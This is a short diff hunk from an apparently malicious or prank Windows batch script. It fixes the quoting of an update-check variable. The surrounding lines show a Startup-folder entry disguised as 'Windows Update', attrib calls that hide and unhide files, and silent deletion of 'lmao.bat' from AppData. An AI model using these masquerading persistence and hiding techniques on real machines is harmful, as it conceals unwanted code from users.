@@ -233,7 +233,7 @@ attrib -s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Updat
 goto :createvbs
 :aftervbs
 
-if not %UpdateFromOnline%==True (
+if not "%UpdatedFromOnline%"=="True" (
 attrib -s -h "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
 del "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
 attrib -s -h lmao.bat
